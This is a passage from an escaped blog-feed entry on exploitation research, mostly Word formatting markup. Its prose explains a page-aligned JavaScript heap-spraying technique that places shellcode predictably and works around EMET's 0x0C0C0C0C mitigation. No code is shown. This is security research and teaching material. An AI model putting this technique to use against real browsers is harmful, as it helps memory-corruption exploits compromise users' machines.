Past</title><link>http://www.exploit-monday.com/2011/08/targeted-heap-spraying-0x0c0c0c0c-is.html</link><description>&lt;!--[if gte mso 9]&gt;&lt;xml&gt;  &lt;o:OfficeDocumentSettings&gt;   &lt;o:RelyOnVML&gt;&lt;/o:RelyOnVML&gt;   &lt;o:AllowPNG&gt;&lt;/o:AllowPNG&gt;  &lt;/o:OfficeDocumentSettings&gt; &lt;/xml&gt;&lt;![endif]--&gt;&lt;!--[if gte mso 9]&gt;&lt;xml&gt;  &lt;w:WordDocument&gt;   &lt;w:View&gt;Normal&lt;/w:View&gt;   &lt;w:Zoom&gt;0&lt;/w:Zoom&gt;   &lt;w:TrackMoves&gt;&lt;/w:TrackMoves&gt;   &lt;w:TrackFormatting&gt;&lt;/w:TrackFormatting&gt;   &lt;w:PunctuationKerning&gt;&lt;/w:PunctuationKerning&gt;   &lt;w:ValidateAgainstSchemas&gt;&lt;/w:ValidateAgainstSchemas&gt;   &lt;w:SaveIfXMLInvalid&gt;false&lt;/w:SaveIfXMLInvalid&gt;   &lt;w:IgnoreMixedContent&gt;false&lt;/w:IgnoreMixedContent&gt;   &lt;w:AlwaysShowPlaceholderText&gt;false&lt;/w:AlwaysShowPlaceholderText&gt;   &lt;w:DoNotPromoteQF&gt;&lt;/w:DoNotPromoteQF&gt;   &lt;w:LidThemeOther&gt;EN-US&lt;/w:LidThemeOther&gt;   &lt;w:LidThemeAsian&gt;X-NONE&lt;/w:LidThemeAsian&gt;   &lt;w:LidThemeComplexScript&gt;X-NONE&lt;/w:LidThemeComplexScript&gt;   &lt;w:Compatibility&gt;    &lt;w:BreakWrappedTables&gt;&lt;/w:BreakWrappedTables&gt;    &lt;w:SnapToGridInCell&gt;&lt;/w:SnapToGridInCell&gt;    &lt;w:WrapTextWithPunct&gt;&lt;/w:WrapTextWithPunct&gt;    &lt;w:UseAsianBreakRules&gt;&lt;/w:UseAsianBreakRules&gt;    &lt;w:DontGrowAutofit&gt;&lt;/w:DontGrowAutofit&gt;    &lt;w:SplitPgBreakAndParaMark&gt;&lt;/w:SplitPgBreakAndParaMark&gt;    &lt;w:EnableOpenTypeKerning&gt;&lt;/w:EnableOpenTypeKerning&gt;    &lt;w:DontFlipMirrorIndents&gt;&lt;/w:DontFlipMirrorIndents&gt;    &lt;w:OverrideTableStyleHps&gt;&lt;/w:OverrideTableStyleHps&gt;   &lt;/w:Compatibility&gt;   &lt;m:mathPr&gt;    &lt;m:mathFont m:val="Cambria Math"/&gt;    &lt;m:brkBin m:val="before"/&gt;    &lt;m:brkBinSub m:val="&amp;#45;-"/&gt;    &lt;m:smallFrac m:val="off"/&gt;    &lt;m:dispDef&gt;&lt;/m:dispDef&gt;    &lt;m:lMargin m:val="0"/&gt;    &lt;m:rMargin m:val="0"/&gt;    &lt;m:defJc m:val="centerGroup"/&gt;    &lt;m:wrapIndent m:val="1440"/&gt;    &lt;m:intLim m:val="subSup"/&gt;    &lt;m:naryLim m:val="undOvr"/&gt;   &lt;/m:mathPr&gt;&lt;/w:WordDocument&gt; &lt;/xml&gt;&lt;![endif]--&gt;&lt;!--[if gte mso 9]&gt;&lt;xml&gt;  &lt;w:LatentStyles DefLockedState="false" DefUnhideWhenUsed="true"
  DefSemiHidden="true" DefQFormat="false" DefPriority="99"
  LatentStyleCount="267"&gt;   &lt;w:LsdException Locked="false" Priority="0" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Normal"/&gt;   &lt;w:LsdException Locked="false" Priority="9" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="heading 1"/&gt;   &lt;w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 2"/&gt;   &lt;w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 3"/&gt;   &lt;w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 4"/&gt;   &lt;w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 5"/&gt;   &lt;w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 6"/&gt;   &lt;w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 7"/&gt;   &lt;w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 8"/&gt;   &lt;w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 9"/&gt;   &lt;w:LsdException Locked="false" Priority="39" Name="toc 1"/&gt;   &lt;w:LsdException Locked="false" Priority="39" Name="toc 2"/&gt;   &lt;w:LsdException Locked="false" Priority="39" Name="toc 3"/&gt;   &lt;w:LsdException Locked="false" Priority="39" Name="toc 4"/&gt;   &lt;w:LsdException Locked="false" Priority="39" Name="toc 5"/&gt;   &lt;w:LsdException Locked="false" Priority="39" Name="toc 6"/&gt;   &lt;w:LsdException Locked="false" Priority="39" Name="toc 7"/&gt;   &lt;w:LsdException Locked="false" Priority="39" Name="toc 8"/&gt;   &lt;w:LsdException Locked="false" Priority="39" Name="toc 9"/&gt;   &lt;w:LsdException Locked="false" Priority="35" QFormat="true" Name="caption"/&gt;   &lt;w:LsdException Locked="false" Priority="10" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Title"/&gt;   &lt;w:LsdException Locked="false" Priority="1" Name="Default Paragraph Font"/&gt;   &lt;w:LsdException Locked="false" Priority="11" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Subtitle"/&gt;   &lt;w:LsdException Locked="false" Priority="22" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Strong"/&gt;   &lt;w:LsdException Locked="false" Priority="20" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Emphasis"/&gt;   &lt;w:LsdException Locked="false" Priority="59" SemiHidden="false"
   UnhideWhenUsed="false" Name="Table Grid"/&gt;   &lt;w:LsdException Locked="false" UnhideWhenUsed="false" Name="Placeholder Text"/&gt;   &lt;w:LsdException Locked="false" Priority="1" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="No Spacing"/&gt;   &lt;w:LsdException Locked="false" Priority="60" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Shading"/&gt;   &lt;w:LsdException Locked="false" Priority="61" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light List"/&gt;   &lt;w:LsdException Locked="false" Priority="62" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Grid"/&gt;   &lt;w:LsdException Locked="false" Priority="63" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 1"/&gt;   &lt;w:LsdException Locked="false" Priority="64" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 2"/&gt;   &lt;w:LsdException Locked="false" Priority="65" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 1"/&gt;   &lt;w:LsdException Locked="false" Priority="66" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 2"/&gt;   &lt;w:LsdException Locked="false" Priority="67" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 1"/&gt;   &lt;w:LsdException Locked="false" Priority="68" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 2"/&gt;   &lt;w:LsdException Locked="false" Priority="69" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 3"/&gt;   &lt;w:LsdException Locked="false" Priority="70" SemiHidden="false"
   UnhideWhenUsed="false" Name="Dark List"/&gt;   &lt;w:LsdException Locked="false" Priority="71" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Shading"/&gt;   &lt;w:LsdException Locked="false" Priority="72" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful List"/&gt;   &lt;w:LsdException Locked="false" Priority="73" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Grid"/&gt;   &lt;w:LsdException Locked="false" Priority="60" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Shading Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="61" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light List Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="62" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Grid Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="63" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 1 Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="64" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 2 Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="65" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 1 Accent 1"/&gt;   &lt;w:LsdException Locked="false" UnhideWhenUsed="false" Name="Revision"/&gt;   &lt;w:LsdException Locked="false" Priority="34" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="List Paragraph"/&gt;   &lt;w:LsdException Locked="false" Priority="29" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Quote"/&gt;   &lt;w:LsdException Locked="false" Priority="30" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Intense Quote"/&gt;   &lt;w:LsdException Locked="false" Priority="66" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 2 Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="67" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 1 Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="68" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 2 Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="69" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 3 Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="70" SemiHidden="false"
   UnhideWhenUsed="false" Name="Dark List Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="71" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Shading Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="72" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful List Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="73" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Grid Accent 1"/&gt;   &lt;w:LsdException Locked="false" Priority="60" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Shading Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="61" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light List Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="62" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Grid Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="63" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 1 Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="64" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 2 Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="65" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 1 Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="66" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 2 Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="67" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 1 Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="68" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 2 Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="69" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 3 Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="70" SemiHidden="false"
   UnhideWhenUsed="false" Name="Dark List Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="71" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Shading Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="72" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful List Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="73" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Grid Accent 2"/&gt;   &lt;w:LsdException Locked="false" Priority="60" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Shading Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="61" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light List Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="62" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Grid Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="63" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 1 Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="64" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 2 Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="65" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 1 Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="66" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 2 Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="67" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 1 Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="68" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 2 Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="69" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 3 Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="70" SemiHidden="false"
   UnhideWhenUsed="false" Name="Dark List Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="71" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Shading Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="72" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful List Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="73" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Grid Accent 3"/&gt;   &lt;w:LsdException Locked="false" Priority="60" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Shading Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="61" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light List Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="62" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Grid Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="63" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 1 Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="64" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 2 Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="65" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 1 Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="66" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 2 Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="67" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 1 Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="68" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 2 Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="69" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 3 Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="70" SemiHidden="false"
   UnhideWhenUsed="false" Name="Dark List Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="71" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Shading Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="72" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful List Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="73" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Grid Accent 4"/&gt;   &lt;w:LsdException Locked="false" Priority="60" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Shading Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="61" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light List Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="62" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Grid Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="63" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 1 Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="64" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 2 Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="65" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 1 Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="66" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 2 Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="67" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 1 Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="68" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 2 Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="69" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 3 Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="70" SemiHidden="false"
   UnhideWhenUsed="false" Name="Dark List Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="71" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Shading Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="72" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful List Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="73" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Grid Accent 5"/&gt;   &lt;w:LsdException Locked="false" Priority="60" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Shading Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="61" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light List Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="62" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Grid Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="63" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 1 Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="64" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 2 Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="65" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 1 Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="66" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium List 2 Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="67" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 1 Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="68" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 2 Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="69" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Grid 3 Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="70" SemiHidden="false"
   UnhideWhenUsed="false" Name="Dark List Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="71" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Shading Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="72" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful List Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="73" SemiHidden="false"
   UnhideWhenUsed="false" Name="Colorful Grid Accent 6"/&gt;   &lt;w:LsdException Locked="false" Priority="19" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Subtle Emphasis"/&gt;   &lt;w:LsdException Locked="false" Priority="21" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Intense Emphasis"/&gt;   &lt;w:LsdException Locked="false" Priority="31" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Subtle Reference"/&gt;   &lt;w:LsdException Locked="false" Priority="32" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Intense Reference"/&gt;   &lt;w:LsdException Locked="false" Priority="33" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Book Title"/&gt;   &lt;w:LsdException Locked="false" Priority="37" Name="Bibliography"/&gt;   &lt;w:LsdException Locked="false" Priority="39" QFormat="true" Name="TOC Heading"/&gt;  &lt;/w:LatentStyles&gt; &lt;/xml&gt;&lt;![endif]--&gt;&lt;!--[if gte mso 10]&gt; &lt;style&gt;
 /* Style Definitions */
 table.MsoNormalTable
	{mso-style-name:"Table Normal";
	mso-tstyle-rowband-size:0;
	mso-tstyle-colband-size:0;
	mso-style-noshow:yes;
	mso-style-priority:99;
	mso-style-parent:"";
	mso-padding-alt:0in 5.4pt 0in 5.4pt;
	mso-para-margin-top:0in;
	mso-para-margin-right:0in;
	mso-para-margin-bottom:10.0pt;
	mso-para-margin-left:0in;
	line-height:115%;
	mso-pagination:widow-orphan;
	font-size:11.0pt;
	font-family:"Calibri","sans-serif";
	mso-ascii-font-family:Calibri;
	mso-ascii-theme-font:minor-latin;
	mso-hansi-font-family:Calibri;
	mso-hansi-theme-font:minor-latin;
	mso-bidi-font-family:"Times New Roman";
	mso-bidi-theme-font:minor-bidi;}
&lt;/style&gt; &lt;![endif]--&gt;  &lt;br /&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;Traditionally, heap spraying has relied upon spraying with 0x0C0C0C0C followed by shellcode which serves as both an address in the heap and a series of nops. This however is not extremely reliable. You have to be lucky enough to not land on a heap header or somewhere in your shellcode. Additionally, the latest version of EMET now prevents the execution of address 0x0C0C0C0C or any other arbitrary address specified in the registry. While this is a futile attempt to prevent heap spraying, it will require another method to reliably execute shellcode in the heap. Rather, there is a method that allows you to reliably allocate shellcode that is both in a predictable location and memory page-aligned (64K-aligned).&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;It turns out that allocations in Javascript of at least 512K are allocated using VirtualAlloc, which returns addresses that are page aligned (i.e. in the form of 0xXXXX0000). I credit Alexander Sotirov with this discovery as I learned this technique from him. There are many ways to place shellcode in the heap but string allocations are the tried and true heap allocation primitive in javascript. The format of a javascript string on the heap is as follows:&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div align="center" class="MsoNoSpacing" style="text-align: center;"&gt;[string length - 4 bytes][Unicode encoded string][\x00\x00]&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: center;"&gt;The following diagram illustrates a string’s layout in memory:&lt;/div&gt;&lt;div class="separator" style="clear: both; text-align: center;"&gt;&lt;a href="http://4.bp.blogspot.com/-xM3evabUguA/TlulZu6npaI/AAAAAAAAAB0/afhXWHrFcd0/s1600/spray_diagram.png" style="margin-left: 1em; margin-right: 1em;"&gt;&lt;img border="0" src="http://4.bp.blogspot.com/-xM3evabUguA/TlulZu6npaI/AAAAAAAAAB0/afhXWHrFcd0/s1600/spray_diagram.png" /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class="MsoNoSpacing" style="text-align: justify;"&gt;&amp;nbsp; &lt;!--[if gte mso 9]&gt;&lt;xml&gt;  &lt;o:OfficeDocumentSettings&gt;   &lt;o:RelyOnVML&gt;&lt;/o:RelyOnVML&gt;   &lt;o:AllowPNG&gt;&lt;/o:AllowPNG&gt;  &lt;/o:OfficeDocumentSettings&gt; &lt;/xml&gt;&lt;![endif]--&gt;&lt;!--[if gte mso 9]&gt;&lt;xml&gt;  &lt;w:WordDocument&gt;   &lt;w:View&gt;Normal&lt;/w:View&gt;   &lt;w:Zoom&gt;0&lt;/w:Zoom&gt;   &lt;w:TrackMoves&gt;&lt;/w:TrackMoves&gt;   &lt;w:TrackFormatting&gt;&lt;/w:TrackFormatting&gt;   &lt;w:PunctuationKerning&gt;&lt;/w:PunctuationKerning&gt;   &lt;w:ValidateAgainstSchemas&gt;&lt;/w:ValidateAgainstSchemas&gt;   &lt;w:SaveIfXMLInvalid&gt;false&lt;/w:SaveIfXMLInvalid&gt;   &lt;w:IgnoreMixedContent&gt;false&lt;/w:IgnoreMixedContent&gt;   &lt;w:AlwaysShowPlaceholderText&gt;false&lt;/w:AlwaysShowPlaceholderText&gt;   &lt;w:DoNotPromoteQF&gt;&lt;/w:DoNotPromoteQF&gt;   &lt;w:LidThemeOther&gt;EN-US&lt;/w:LidThemeOther&gt;   &lt;w:LidThemeAsian&gt;X-NONE&lt;/w:LidThemeAsian&gt;   &lt;w:LidThemeComplexScript&gt;X-NONE&lt;/w:LidThemeComplexScript&gt;   &lt;w:Compatibility&gt;    &lt;w:BreakWrappedTables&gt;&lt;/w:BreakWrappedTables&gt;    &lt;w:SnapToGridInCell&gt;&lt;/w:SnapToGridInCell&gt;    &lt;w:WrapTextWithPunct&gt;&lt;/w:WrapTextWithPunct&gt;    &lt;w:UseAsianBreakRules&gt;&lt;/w:UseAsianBreakRules&gt;    &lt;w:DontGrowAutofit&gt;&lt;/w:DontGrowAutofit&gt;    &lt;w:SplitPgBreakAndParaMark&gt;&lt;/w:SplitPgBreakAndParaMark&gt;    &lt;w:EnableOpenTypeKerning&gt;&lt;/w:EnableOpenTypeKerning&gt;    &lt;w:DontFlipMirrorIndents&gt;&lt;/w:DontFlipMirrorIndents&gt;    &lt;w:OverrideTableStyleHps&gt;&lt;/w:OverrideTableStyleHps&gt;   &lt;/w:Compatibility&gt;   &lt;m:mathPr&gt;    &lt;m:mathFont m:val="Cambria Math"/&gt;    &lt;m:brkBin m:val="before"/&gt;    &lt;m:brkBinSub m:val="&amp;#45;-"/&gt;    &lt;m:smallFrac m:val="off"/&gt;    &lt;m:dispDef&gt;&lt;/m:dispDef&gt;    &lt;m:lMargin m:val="0"/&gt;    &lt;m:rMargin m:val="0"/&gt;    &lt;m:defJc m:val="centerGroup"/&gt;    &lt;m:wrapIndent m:val="1440"/&gt;    &lt;m:intLim m:val="subSup"/&gt;    &lt;m:naryLim m:val="undOvr"/&gt;   &lt;/m:mathPr&gt;&lt;/w:WordDocument&gt; &lt;/xml&gt;&lt;![endif]--&gt;&lt;!--[if gte mso 9]&gt;&lt;xml&gt;  &lt;w:LatentStyles DefLockedState="false" DefUnhideWhenUsed="true"
  DefSemiHidden="true" DefQFormat="false" DefPriority="99"
  LatentStyleCount="267"&gt;   &lt;w:LsdException Locked="false" Priority="0" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Normal"/&gt;   &lt;w:LsdException Locked="false" Priority="9" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="heading 1"/&gt;   &lt;w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 2"/&gt;   &lt;w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 3"/&gt;   &lt;w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 4"/&gt;   &lt;w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 5"/&gt;   &lt;w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 6"/&gt;   &lt;w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 7"/&gt;   &lt;w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 8"/&gt;   &lt;w:LsdException Locked="false" Priority="9" QFormat="true" Name="heading 9"/&gt;   &lt;w:LsdException Locked="false" Priority="39" Name="toc 1"/&gt;   &lt;w:LsdException Locked="false" Priority="39" Name="toc 2"/&gt;   &lt;w:LsdException Locked="false" Priority="39" Name="toc 3"/&gt;   &lt;w:LsdException Locked="false" Priority="39" Name="toc 4"/&gt;   &lt;w:LsdException Locked="false" Priority="39" Name="toc 5"/&gt;   &lt;w:LsdException Locked="false" Priority="39" Name="toc 6"/&gt;   &lt;w:LsdException Locked="false" Priority="39" Name="toc 7"/&gt;   &lt;w:LsdException Locked="false" Priority="39" Name="toc 8"/&gt;   &lt;w:LsdException Locked="false" Priority="39" Name="toc 9"/&gt;   &lt;w:LsdException Locked="false" Priority="35" QFormat="true" Name="caption"/&gt;   &lt;w:LsdException Locked="false" Priority="10" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Title"/&gt;   &lt;w:LsdException Locked="false" Priority="1" Name="Default Paragraph Font"/&gt;   &lt;w:LsdException Locked="false" Priority="11" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Subtitle"/&gt;   &lt;w:LsdException Locked="false" Priority="22" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Strong"/&gt;   &lt;w:LsdException Locked="false" Priority="20" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="Emphasis"/&gt;   &lt;w:LsdException Locked="false" Priority="59" SemiHidden="false"
   UnhideWhenUsed="false" Name="Table Grid"/&gt;   &lt;w:LsdException Locked="false" UnhideWhenUsed="false" Name="Placeholder Text"/&gt;   &lt;w:LsdException Locked="false" Priority="1" SemiHidden="false"
   UnhideWhenUsed="false" QFormat="true" Name="No Spacing"/&gt;   &lt;w:LsdException Locked="false" Priority="60" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Shading"/&gt;   &lt;w:LsdException Locked="false" Priority="61" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light List"/&gt;   &lt;w:LsdException Locked="false" Priority="62" SemiHidden="false"
   UnhideWhenUsed="false" Name="Light Grid"/&gt;   &lt;w:LsdException Locked="false" Priority="63" SemiHidden="false"
   UnhideWhenUsed="false" Name="Medium Shading 1"/&gt;   &lt;w:LsdException Locked="false" Priority="64" SemiHidden="false"
